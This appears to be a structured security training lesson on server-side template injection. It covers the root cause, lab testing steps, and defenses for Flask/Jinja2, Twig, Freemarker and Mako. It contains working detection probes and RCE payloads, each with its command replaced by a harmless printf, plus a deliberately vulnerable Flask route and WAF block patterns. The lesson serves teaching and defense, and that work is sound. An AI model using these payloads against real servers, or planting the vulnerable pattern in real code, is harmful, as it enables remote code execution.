---
schema_version: 1
id: WEB-A05-SSTI
title: "Server-Side Template Injection (SSTI)"
slug: ssti
level: advanced
estimated_minutes: 65
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A05:2025
cwe:
  - CWE-1336
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# Server-Side Template Injection (SSTI)

> [!CAUTION]
> Only practice on systems you own or are explicitly authorized. Use synthetic data, disposable fixtures, and limit resources; do not send payloads to the Internet or real targets.

## 1. Learning Objectives

After this lesson, you can:

- Explain Server-Side Template Injection (SSTI) by root cause instead of only describing the consequences.
- Identify trust boundaries, assets, actors, and the necessary conditions for the vulnerability to be exploitable.
- Conduct controlled testing in a local lab and distinguish expected results from false positives.
- Choose root controls, implement fixes, and retest using positive, negative, and boundary cases.

## 2. Prerequisites

- Understand the HTTP request/response flow of the Server-Side Template Injection (SSTI) scenario and how to apply input handling across trust boundaries.
- Distinguish between authentication, authorization, and validation.
- Be able to read code/configuration in the language or framework appearing in the example.
- Have a local isolated lab, synthetic data, observable logs, and clear testing permissions.

## 3. Background Knowledge

To quickly create visually appealing dynamic websites, developers use tools called Template Engines (such as Jinja2 in Python, Twig in PHP, or Freemarker in Java). Imagine a Template Engine as a mailing template with empty fields like `{{ customer_name }}`. The tool automatically fills in the actual names into the template before sending it. When functioning properly, user data is passed separately as parameters, making it extremely safe, and the browser only displays it as plain text.

```python
# Normal Jinja2 template rendering in Flask
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/hello/<name>')
def hello(name):
    # Safe: user input is passed as DATA to the template
    template = "Hello, {{ username }}! Welcome to our site."
    return render_template_string(template, username=name)
    # Template engine escapes the value and renders it safely
```
Key point: when user input is passed as **data** into the template, it is safe. The problem arises when user input is **directly embedded into the template string** before rendering — at this point the input becomes part of the template code and is executed by the engine.

## 4. Description and Root Cause

The Server-Side Template Injection vulnerability (SSTI) occurs when developers directly concatenate user information strings into the template structure before processing, instead of passing them as separate data. This is like allowing the letter recipient to write additional logical instructions into your template. An attacker can inject special programming syntax into input fields to make the Template Engine execute it. Since these Template Engines run directly on the server and have access to underlying core programming functions, attackers can exploit this to steal secret files, capture environment variables, or execute system commands to gain complete control of the server (RCE).

> **Reference:** Technical claims in the lesson are marked with source markers; when applying in practice, refer to the version/framework being used: [S1], [S2], [S3], [S4], [S5].

## 5. Threat Model and Exploitation Conditions

- **Assets:** template context, runtime object, and process privileges.  
- **Actor, authentication, and role:** user role controls which profile fields are rendered.  
- **Exploitation conditions:** input becomes the template source, so the engine evaluates expressions/object graphs.  
- **Browser, proxy, framework, and version:** Flask/Jinja2, Twig, Freemarker, and Mako fixtures pinned in isolated no-network containers; must record actual image/package versions along with evidence.  
- **Mandatory evidence:** linked to correlation ID, input must be connected, control decisions, and impact the correct asset; individual status codes are insufficient. [S1]

## 6. Attack Mechanism

For SSTI, input becomes the template source so the engine evaluates the expression/object graph. The positive case must prove that the input reaches the correct sink and creates the described effect; the negative case must be blocked before any side effect when source control is enabled. The conclusion only applies to the environment pinned in section 5. [S1]

## 7. Testing in an Authorized Lab

1. **Setup:** launch Flask/Jinja2, Twig, Freemarker, and Mako fixtures pinned in a separate no-network container; only load synthetic data, enable application/proxy/datastore logging, and attach correlation ID.
2. **Baseline:** send a valid input for the SSTI use case; record raw request/response, decide policy and asset status before the test.
3. **Input and actions:** use exactly one core payload in item 8 within the annotated context; change one variable at a time and comply with request caps.
4. **Expected result:** consider a fixture vulnerable as positive only when logs prove the mechanism "input becomes template source and the engine evaluates expression/object graph"; secure fixture must block before side effects and boundary input must fail closed.
5. **Cleanup:** delete SSTI data, markers, and logs; reclaim related sessions/cache, revert snapshot, and verify no remaining test callbacks/processes.
6. **Safety limits:** run only on loopback/`.lab.test`; do not use real target, credentials, or data; OOB/DoS/state-changing must have network/CPU/memory/request cap.

## 8. Payloads and Scope of Applicability

The blocks below are minimal lab examples according to the context recorded in the annotation. Before use, check the framework/version, encoding, expected result, and risk; only run in an authorized local fixture. Extended payload belongs to `security_cheatsheet.md`; lessons only retain the core examples.

### Step 1: Detection SSTI

<!-- payload-id: WEB-A05-SSTI-001 -->
<!-- context: template-expression probes evaluated separately in pinned Jinja2, Twig, Freemarker, Mako, Pebble, Thymeleaf and ERB fixtures -->
<!-- prerequisites: one arithmetic probe per disposable engine fixture; no sensitive objects; no outbound network -->
<!-- encoding: UTF-8 template source; the arrow/result labels are documentation and are not submitted -->
<!-- expected-result: only the matching fixture evaluates its isolated arithmetic expression; literal output or parser error is recorded for others -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Polyglot detection payload - test across multiple engines
${{<%[%'"}}%\.

# Engine-specific probes
{{7*7}}         → 49   (Jinja2, Twig)
${7*7}          → 49   (Freemarker, Mako, EL)
#{7*7}          → 49   (Pebble, Thymeleaf)
<%= 7*7 %>      → 49   (ERB - Ruby)
{{7*'7'}}       → 7777777  (Jinja2 specifically, string repeat)
{{7*'7'}}       → 49       (Twig, does multiplication)
```
### Step 2: RCE Payloads by Engine

<!-- payload-id: WEB-A05-SSTI-002 -->
<!-- context: pinned vulnerable Flask/Jinja2 fixture that exposes the referenced globals and Python class graph -->
<!-- prerequisites: disposable Python container; no outbound network; commands limited to printf SSTI_LAB; subclass indexes discovered in the same fixture -->
<!-- encoding: UTF-8 Jinja2 expression; shell command is literal ASCII -->
<!-- expected-result: applicable expression returns SSTI_LAB; nonmatching indexes or hardened environment fail without host side effects -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Jinja2 (Python) - Class traversal to reach os.popen()
# Step 1: Access the Method Resolution Order (MRO)
{{''.__class__.__mro__[1].__subclasses__()}}

# Step 2: Find subprocess.Popen (usually index ~400+)
{{''.__class__.__mro__[1].__subclasses__()[408]('printf SSTI_LAB',shell=True,stdout=-1).communicate()}}

# Shorter Jinja2 RCE payload
{{config.__class__.__init__.__globals__['os'].popen('printf SSTI_LAB').read()}}

# Using request object in Flask
{{request.application.__globals__.__builtins__.__import__('os').popen('printf SSTI_LAB').read()}}
```

<!-- payload-id: WEB-A05-SSTI-003 -->
<!-- context: pinned legacy Twig fixture where the demonstrated callback/filter APIs are intentionally exposed -->
<!-- prerequisites: disposable PHP container; no outbound network; command is limited to printf SSTI_LAB; confirm API availability for the pinned Twig version -->
<!-- encoding: UTF-8 Twig template expression; command argument is literal ASCII -->
<!-- expected-result: vulnerable fixture output contains SSTI_LAB; patched or unsupported Twig versions reject the expression -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```php
// Twig (PHP) - Using filter function
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("printf SSTI_LAB")}}

// Twig 3.x payload
{{['SSTI_LAB']|map('printf')}}
```

<!-- payload-id: WEB-A05-SSTI-004 -->
<!-- context: pinned vulnerable Freemarker fixture with Execute utility intentionally available -->
<!-- prerequisites: disposable Java container; no outbound network; command limited to printf SSTI_LAB -->
<!-- encoding: UTF-8 Freemarker expression; command is literal ASCII -->
<!-- expected-result: vulnerable fixture output contains SSTI_LAB; hardened object-wrapper configuration rejects Execute -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```java
// Freemarker (Java) - Built-in Execute
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("printf SSTI_LAB")}

// Using ObjectConstructor
${"freemarker.template.utility.Execute"?new()("printf SSTI_LAB")}
```

<!-- payload-id: WEB-A05-SSTI-005 -->
<!-- context: pinned vulnerable Mako fixture rendering attacker-controlled template source -->
<!-- prerequisites: disposable Python container; no outbound network; command limited to printf SSTI_LAB -->
<!-- encoding: UTF-8 Mako expression; shell command is literal ASCII -->
<!-- expected-result: vulnerable fixture output contains SSTI_LAB; safe fixture treats the input as data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Mako (Python) - Direct Python code execution
<%import os%>${os.popen("printf SSTI_LAB").read()}

# Alternative Mako payload
${__import__('os').popen('printf SSTI_LAB').read()}
```
### Step 2b: Java template/expression engines

<!-- payload-id: WEB-A05-SSTI-007 -->
<!-- context: Apache Velocity 2.x fixture renders attacker-controlled template source in a disposable Java process -->
<!-- prerequisites: only arithmetic and context lookup are enabled; no filesystem, classloader or process execution is exposed -->
<!-- encoding: UTF-8 Velocity template source -->
<!-- expected-result: vulnerable fixture evaluates the arithmetic expression to 49; safe fixture renders it as literal text or rejects user-supplied template source -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3,S4 -->
<!-- last-verified: 2026-07-18 -->
```velocity
#set($x = 7 * 7)$x
```

<!-- payload-id: WEB-A05-SSTI-008 -->
<!-- context: Spring Expression Language fixture evaluates a user-controlled expression in a deliberately vulnerable local route -->
<!-- prerequisites: expression evaluation is isolated; type references and method invocation are disabled in the secure fixture -->
<!-- encoding: UTF-8 SpEL expression source -->
<!-- expected-result: vulnerable fixture evaluates the expression to 49; secure fixture treats the value as data or uses SimpleEvaluationContext with a strict allowlist -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S3,S4 -->
<!-- last-verified: 2026-07-18 -->
```text
#{7 * 7}
```
### Step 3: Exploit reality

<!-- payload-id: WEB-A05-SSTI-006 -->
<!-- context: Flask/Jinja2 route passes the decoded name query value into render_template_string via an f-string -->
<!-- prerequisites: disposable fixture; no outbound network; payload command limited to printf SSTI_LAB; one request -->
<!-- encoding: Jinja2 braces and spaces are percent-encoded once in the HTTP query by the client -->
<!-- expected-result: vulnerable response contains SSTI_LAB; secure route renders the expression literally as user data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Vulnerable Flask application
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/profile')
def profile():
    name = request.args.get('name', 'Guest')
    # VULNERABLE: User input concatenated into template string
    template = f"<h1>Welcome, {name}!</h1>"
    return render_template_string(template)

# Attack URL:
# /profile?name={{config.__class__.__init__.__globals__['os'].popen('printf+SSTI_LAB').read()}}
```

## 9. Vulnerable Code and Secure Code

```python
# ❌ VULNERABLE: User input embedded in template string
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greeting')
def greeting():
    name = request.args.get('name')
    # User input becomes part of the template CODE
    template = f"Hello {name}, welcome back!"
    return render_template_string(template)  # SSTI possible!
```

```python
# ✅ SECURE: User input passed as template data
from flask import Flask, request, render_template_string
from jinja2.sandbox import SandboxedEnvironment

app = Flask(__name__)

@app.route('/greeting')
def greeting():
    name = request.args.get('name')
    # User input is DATA, not part of the template code
    template = "Hello {{ name }}, welcome back!"
    return render_template_string(template, name=name)  # Safe rendering

@app.route('/custom-template')
def custom_template():
    user_template = request.args.get('tpl')
    # If user-provided templates are required, use sandboxed environment
    env = SandboxedEnvironment()
    try:
        tpl = env.from_string(user_template)
        return tpl.render(allowed_var="safe_value")
    except Exception:
        return "Invalid template", 400
```

## 10. Detection

- Log the actor/session, route or operation, object/resource related to Server-Side Template Injection (SSTI), the policy results, and correlation ID; do not log secrets or full tokens.
- Compare authorization/validation failures with a valid baseline and alert according to the behavior chain, not just a single payload chain.
- Combine application telemetry, reverse proxy, and datastore to confirm whether the request reached the sink and whether there was any impact.
- Scanner or WAF alerts are only a signal for investigation; they are not the sole proof that the vulnerability exists. [S1]

## 11. Defense

### Compulsory control

- Keep the source template static and only pass input through data variables.
- Apply the same control to all routes, operations, and equivalent processing paths; failure must stop before any side effect.

### Defense-in-depth

With Server-Side Template Injection (SSTI), the measures below help reduce the blast radius or increase detection capability. Rate limiting, UUID unpredictability, WAF, CSP, or general validation should not be used to replace original control.

- **Summary**: Pass user data through context variables instead of embedding it directly into template strings.
- **Detailed steps**:
  - Never embed user input into template strings: Pass data through context variables.
  - Sandbox environment: Use Jinja2 `SandboxedEnvironment` to limit class/method access.
  - Logic-less templates: Choose a template engine that does not allow code execution (Mustache, Handlebars).
  - WAF rules: Block patterns like `{{`, `${`, `<%`, `__class__`, `__mro__`.
  - Separate templates from user content: If custom templates are needed, run in an isolated container.

## 12. Retest

- **Positive case:** with Server-Side Template Injection (SSTI), the valid flow still works correctly for the allowed actor and data.  
- **Negative case:** with the same input/resource but unauthorized actor or context is rejected without leaking sensitive details.  
- **Boundary case:** check empty values, extreme edge cases, different encodings, repeated requests, expired session states, and equivalent paths/operations.  
- **Telemetry:** validate policy decision, application log, proxy log, and datastore side effects match correlation ID.  
- **Recheck:** keep a minimal scenario to reproduce the old issue and demonstrate the fix does not rely on WAF/rate limit.

## 13. Common Mistakes

- Only check the status code or response string of Server-Side Template Injection (SSTI) without confirming side effects and logs. 
- Use a payload with correct syntax but incorrect DBMS, browser, framework, protocol, or injection context.
- Consider UUID, rate limit, WAF, CSP, or general input validation as a fix for another root control.
- Only fix one route while the same sink/policy is used in other routes.
- Conclude that a vulnerability exists without saving the source, fixture version, and observable proof.

## 14. Summary and Checklist

- [ ] Root cause, consequences, and exploitation techniques have been separated.  
- [ ] Actor, role/authentication, trust boundary, technology, and version are clear.  
- [ ] Payload has a unique ID, context, encoding, conditions, expected result, risk, validation, and source.  
- [ ] Code prone to errors/unsafe uses the same framework, version, and use case.  
- [ ] Mandatory controls cannot be replaced with defense-in-depth.  
- [ ] Positive, negative, boundary cases, and telemetry have been retested.  
- [ ] Sensitive technical claims have references in section 17, and all links are only in sections 16–17.  
- [ ] Cleanup completed; no secrets, real targets, Internet callbacks, or customer data remain.

## 15. Glossary

- **SSTI (Server-Side Template Injection)**: Vulnerability to inject the template engine's code structure into the application for the server to compile.  
- **Template Engine**: A toolkit that helps separate the HTML interface part and the developer's data handling logic.  
- **Render**: The process of inserting actual data into a template to create a complete web page.  
- **Object Model**: A diagram of programming objects that can be accessed from within the language.  
- **RCE**: Remote code execution, allowing control of the server.

## 16. Related Lessons and Further Reading

- [Remote Code Execution ](../../10-exceptional-conditions/remote-code-execution/) — The concept of executing code remotely on the target server, which is the most common consequence when successfully exploiting the vulnerability SSTI.

## 17. References

- **[S1]** PortSwigger. https://portswigger.net/web-security/server-side-template-injection — version/status: current version; accessed: 2026-07-17. 
- **[S2]** HackTricks – SSTI. https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html — version/status: current version; accessed: 2026-07-17. 
- **[S3]** CWE-1336. https://cwe.mitre.org/data/definitions/1336.html — version/status: current version; accessed: 2026-07-17. 
- **[S4]** PayloadsAllTheThings – SSTI. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection — version/status: current version; accessed: 2026-07-17. 
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — version/status: current version; accessed: 2026-07-17.